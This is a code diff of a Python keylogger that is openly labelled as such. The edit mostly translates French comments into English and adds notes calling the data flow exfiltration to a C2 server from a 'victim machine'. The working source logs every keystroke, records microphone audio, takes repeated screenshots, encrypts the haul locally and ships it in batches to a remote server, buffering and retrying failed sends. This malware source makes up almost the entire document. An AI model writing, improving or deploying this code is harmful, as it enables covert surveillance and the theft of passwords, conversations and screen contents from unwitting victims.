@@ -1,3 +1,4 @@
+# Core modules for unique ID, serialization, time, and threading
 import uuid
 import json
 import time
@@ -6,89 +7,90 @@ import base64
 from pathlib import Path
 from io import BytesIO
 
-# Nouveaux imports pour l'audio
-# Vous devez installer PyAudio : pip install PyAudio
-import pyaudio
-import wave
+# Audio capture libraries
+import pyaudio # Requires separate installation: pip install PyAudio
+import wave # Standard Python module for WAV file format
 
-# Nouveaux imports pour la capture d'écran
-import mss # Pour prendre des captures d'écran
-from PIL import Image # Pour la manipulation d'images (si nécessaire)
+# Screen capture libraries
+import mss # Requires separate installation: pip install mss
+from PIL import Image # Requires separate installation: pip install Pillow
 
-from pynput import keyboard
-from cryptography.fernet import Fernet
-# --- MISE À JOUR : Import des configurations depuis config.py ---
-# On importe toutes les variables nécessaires du fichier config
+# Keyboard listener and encryption libraries
+from pynput import keyboard # Requires separate installation: pip install pynput
+from cryptography.fernet import Fernet # Requires separate installation: pip install cryptography
+
+# Custom modules for data exfiltration and configuration
 from sender import send_events
 from config import (
-    SEND_INTERVAL, 
-    AUDIO_RECORD_SECONDS, 
-    AUDIO_RATE, 
-    SCREENSHOT_INTERVAL, 
-    # Pour l'instant on garde les autres variables hors de ce fichier si non utilisées
+    SEND_INTERVAL,  # Interval (s) between event batches being sent to C2
+    AUDIO_RECORD_SECONDS, # Duration (s) for each audio clip
+    AUDIO_RATE, # Sampling rate (Hz) for audio
+    SCREENSHOT_INTERVAL, # Interval (s) between screen captures
 )
 # -------------------------------------------------------------
 
+# Generate a unique identifier for the victim machine
 victim_id = str(uuid.uuid4())
 
+# Define paths for local log files
 encrypted_file = Path("logs/encrypted_log.jsonl")
 buffer_file = Path("logs/buffer.jsonl")
 
+# Ensure the logs directory exists and files are created
 encrypted_file.parent.mkdir(exist_ok=True)
 encrypted_file.touch(exist_ok=True)
 buffer_file.touch(exist_ok=True)
 
+# Initialize Fernet encryption
 key = Fernet.generate_key()
 cipher = Fernet(key)
 
-events = [] # Liste globale pour les événements (clavier + audio + screenshot)
+# Global list to store collected events (keyboard, audio, screenshot) before sending
+events = []
 
-# ----------------- CONFIGURATION AUDIO (Utilise config.py) -----------------
-# Définir les paramètres d'enregistrement audio
-CHUNK = 1024 # Nombre de frames par buffer
-FORMAT = pyaudio.paInt16 # 16 bits
+# ----------------- AUDIO CONFIGURATION (Loaded from config.py) -----------------
+# Define audio recording parameters
+CHUNK = 1024 # Frames per buffer
+FORMAT = pyaudio.paInt16 # 16-bit encoding
 CHANNELS = 1 # Mono
-# UTILISE LES CONSTANTES IMPORTÉES
-RATE = AUDIO_RATE # Taux d'échantillonnage (Hz)
-RECORD_SECONDS = AUDIO_RECORD_SECONDS # Durée de chaque enregistrement audio
-# ---------------------------------------------------------------------------
-
-# ----------------- CONFIGURATION SCREENSHOT (Utilise config.py) -----------------
-# UTILISE LA CONSTANTE IMPORTÉE
-# SCREENSHOT_INTERVAL est maintenant défini dans config.py
-# --------------------------------------------------------------------------------
+RATE = AUDIO_RATE # Sampling rate (Hz)
+RECORD_SECONDS = AUDIO_RECORD_SECONDS # Duration of each audio clip
+# -------------------------------------------------------------------------------
 
 def encrypt_event(event):
-    """Chiffre un événement JSON."""
+    """Encrypts a JSON event dictionary using Fernet."""
     return cipher.encrypt(json.dumps(event).encode()).decode()
 
 def save_local_encrypted(event):
-    """Sauvegarde un événement chiffré dans le fichier de log local."""
+    """Saves an encrypted event to the local log file."""
+    # This acts as a persistent local log for all captured data
     with open(encrypted_file, "a") as f:
         f.write(encrypt_event(event) + "\n")
 
 def save_buffer(events_to_save):
-    """Sauvegarde une liste d'événements dans le buffer en cas d'échec d'envoi."""
+    """Saves a list of events to the buffer file if C2 sending fails."""
     with open(buffer_file, "a") as f:
         for e in events_to_save:
             f.write(json.dumps(e) + "\n")
 
 def read_buffer():
-    """Lit et vide le buffer d'événements."""
+    """Reads and clears the buffer file, returning buffered events."""
     if buffer_file.stat().st_size == 0:
         return []
     with open(buffer_file, "r") as f:
         lines = f.readlines()
-    buffer_file.write_text("") # Vider le buffer après lecture
+    buffer_file.write_text("") # Clear the buffer after reading (critical for resilience)
     return [json.loads(l) for l in lines]
 
-# ----------------- CAPTURE CLAVIER -----------------
+# ----------------- KEYBOARD CAPTURE -----------------
 def on_press(key):
-    """Gère l'événement de pression de touche."""
+    """Handles key press events."""
     ts = time.time()
     try:
+        # Get the character if available
         k = key.char
     except AttributeError:
+        # For special keys (Enter, Shift, etc.), get the string representation
         k = str(key)
 
     event = {"timestamp": ts, "type": "keyboard", "key": k}
@@ -96,41 +98,40 @@ def on_press(key):
     save_local_encrypted(event)
 
 def on_release(key):
-    """Gère l'événement de relâchement de touche."""
+    """Handles key release events."""
+    # Stops the keyboard listener if the ESC key is pressed
     if key == keyboard.Key.esc:
-        print("Arrêt manuel")
-        # Ne retourne pas False pour que le thread de clavier s'arrête
+        print("Manual stop triggered")
         return False
 
-# ----------------- CAPTURE AUDIO -----------------
+# ----------------- AUDIO CAPTURE -----------------
 def audio_capture_routine():
-    """Routine pour capturer l'audio en continu."""
-    # On utilise les variables globales/importées RECORD_SECONDS et RATE
-    global RATE, RECORD_SECONDS 
+    """Routine for continuous audio capture."""
+    global RATE, RECORD_SECONDS
     
     try:
         p = pyaudio.PyAudio()
 
-        # Ouvrir un flux audio (stream)
+        # Open audio stream
         stream = p.open(format=FORMAT,
                             channels=CHANNELS,
                             rate=RATE,
                             input=True,
                             frames_per_buffer=CHUNK)
 
-        print("[Audio] Démarrage de la capture audio...")
+        print("[Audio] Starting audio capture...")
 
         while True:
-            # Enregistrer pour la durée définie (RECORD_SECONDS)
             frames = []
+            # Record audio for the configured duration (RECORD_SECONDS)
             for _ in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
-                data = stream.read(CHUNK)
+                data = stream.read(CHUNK, exception_on_overflow=False) # Suppress overflow error
                 frames.append(data)
 
-            # Convertir les frames audio en données brutes
+            # Convert raw audio frames to a single bytes object
             audio_data = b''.join(frames)
             
-            # Encoder les données brutes en base64 pour un stockage JSON sûr
+            # Encode raw data to base64 for safe transmission in JSON
             encoded_audio = base64.b64encode(audio_data).decode('utf-8')
             
             ts = time.time()
@@ -140,50 +141,50 @@ def audio_capture_routine():
                 "duration": RECORD_SECONDS,
                 "rate": RATE,
                 "channels": CHANNELS,
-                "format": "pcm16_base64",
+                "format": "pcm16_base64", # Indicates 16-bit PCM data, base64 encoded
                 "data": encoded_audio
             }
             
-            # Ajouter à la liste globale des événements
+            # Add to global events list and save locally
             events.append(audio_event)
             save_local_encrypted(audio_event)
-            print(f"[Audio] Événement audio de {RECORD_SECONDS}s capturé et chiffré.")
+            print(f"[Audio] Audio event of {RECORD_SECONDS}s captured and encrypted.")
 
     except ImportError:
-        print("[ERREUR] PyAudio n'est pas installé. La capture audio est désactivée.")
+        print("[ERROR] PyAudio is not installed. Audio capture is disabled.")
     except Exception as e:
-        print(f"[ERREUR] Erreur lors de la capture audio: {e}")
+        print(f"[ERROR] Error during audio capture: {e}")
     finally:
-        # Fermeture propre en cas d'erreur ou d'arrêt
+        # Clean shutdown of audio resources
         if 'stream' in locals() and stream.is_active():
             stream.stop_stream()
             stream.close()
         if 'p' in locals():
             p.terminate()
 
-# ----------------- CAPTURE SCREENSHOT -----------------
+# ----------------- SCREENSHOT CAPTURE -----------------
 def screenshot_capture_routine():
-    """Routine pour capturer des captures d'écran en continu."""
-    # On utilise la variable globale/importée SCREENSHOT_INTERVAL
+    """Routine for continuous screenshot capture."""
+
     global SCREENSHOT_INTERVAL
 
-    print("[Screenshot] Démarrage de la capture d'écran...")
+    print("[Screenshot] Starting screenshot capture...")
     
     try:
         with mss.mss() as sct:
             while True:
-                # Capturer l'écran principal (moniteur 0)
+                # Capture the primary monitor (index 0)
                 monitor = sct.monitors[0]
                 sct_img = sct.grab(monitor)
                 
-                # Convertir l'image capturée en un format binaire (PNG)
+                # Use BytesIO to handle the image in memory
                 img_buffer = BytesIO()
                 
-                # Utiliser Pillow pour enregistrer l'image brute de mss dans le buffer
+                # Convert raw mss image data to PIL Image object, then save as PNG to buffer
                 img = Image.frombytes("RGB", sct_img.size, sct_img.rgb, "raw", "BGR")
                 img.save(img_buffer, format="PNG")
                 
-                # Encoder les données binaires en base64 pour l'envoi JSON
+                # Encode binary image data to base64 for JSON transmission
                 encoded_image = base64.b64encode(img_buffer.getvalue()).decode('utf-8')
                 
                 ts = time.time()
@@ -191,78 +192,78 @@ def screenshot_capture_routine():
                     "timestamp": ts,
                     "type": "screenshot",
                     "format": "png_base64",
-                    # WARNING: Ces données sont très volumineuses !
+                    # WARNING: This data is often very large!
                     "data": encoded_image
                 }
                 
-                # Ajouter à la liste globale des événements
+                # Add to global events list and save locally
                 global events
                 events.append(screenshot_event)
                 save_local_encrypted(screenshot_event)
-                print(f"[Screenshot] Capture d'écran capturée et chiffrée. Taille: {len(encoded_image) // 1024} KB")
+                print(f"[Screenshot] Screenshot captured and encrypted. Size: {len(encoded_image) // 1024} KB")
 
-                # Attendre l'intervalle avant la prochaine capture (utilise la valeur de config.py)
+                # Wait for the configured interval before the next capture
                 time.sleep(SCREENSHOT_INTERVAL)
                 
     except ImportError:
-        print("[ERREUR] mss ou Pillow ne sont pas installés. La capture d'écran est désactivée.")
+        print("[ERROR] mss or Pillow are not installed. Screenshot capture is disabled.")
     except Exception as e:
-        print(f"[ERREUR] Erreur lors de la capture d'écran: {e}")
+        print(f"[ERROR] Error during screenshot capture: {e}")
 
 
-# ----------------- ROUTINE D'ENVOI -----------------
+# ----------------- SEND ROUTINE -----------------
 def send_routine():
-    """Routine pour envoyer les événements au serveur."""
-    # On utilise la variable globale/importée SEND_INTERVAL
+    """Routine for periodically sending events to the C2 server."""
+
     global SEND_INTERVAL
     
     while True:
-        # Utilise la valeur de config.py
+        # Wait for the configured interval (from config.py)
         time.sleep(SEND_INTERVAL)
 
         global events
-        # Vérifier si on a des événements ou si le buffer est vide
+        # Check if there are new events or if the buffer contains unsent events
         if not events and buffer_file.stat().st_size == 0:
             continue
 
-        # combiner buffer + events
+        # Combine buffered events (if any) with new events
         buffered = read_buffer()
         to_send = buffered + events
         events.clear()
 
-        print(f"[Sender] Envoi de {len(to_send)} événements...")
+        print(f"[Sender] Sending {len(to_send)} events...")
+        # Send data to the C2 server via the external 'sender' module
         success = send_events(victim_id, to_send)
         
         if not success:
-            print("[Sender] Échec de l'envoi, sauvegarde dans le buffer.")
+            print("[Sender] Fail to send, backup inside buffer.")
             save_buffer(to_send)
         else:
-            print("[Sender] Envoi réussi.")
+            print("[Sender] Sending successful.")
 
 
-# ----------------- MAIN -----------------
+# ----------------- MAIN EXECUTION -----------------
 if __name__ == "__main__":
-    print(f"Simulation keylogger active (UUID={victim_id})")
+    print(f"Keylogger active (UUID={victim_id})")
 
-    # 1. Démarrer le thread d'envoi
+    # 1. Start the sender thread (Daemon ensures it stops when the main thread stops)
     t_sender = threading.Thread(target=send_routine, daemon=True)
     t_sender.start()
     
-    # 2. Démarrer le thread de capture audio
+    # 2. Start the audio capture thread
     t_audio = threading.Thread(target=audio_capture_routine, daemon=True)
     t_audio.start()
 
-    # 3. Démarrer le thread de capture d'écran
+    # 3. Start the screenshot capture thread
     t_screenshot = threading.Thread(target=screenshot_capture_routine, daemon=True)
     t_screenshot.start()
 
-    # 4. Démarrer le listener clavier
+    # 4. Start the keyboard listener (This is the main blocking thread)
     listener = keyboard.Listener(on_press=on_press, on_release=on_release)
     listener.start()
     
-    # Attendre que le listener clavier se termine (nécessaire pour maintenir le script en vie)
+    # Block the main thread until the listener is stopped (e.g., by pressing ESC)
     listener.join()
     
-    # Si le listener s'arrête (via ESC), on s'assure que les autres threads s'arrêtent aussi
-    # Comme les autres sont des daemons, ils s'arrêteront avec le thread principal.
-    print("Programme terminé.")
+    # Once listener stops, the daemon threads will terminate automatically
+    print("End of the program.")
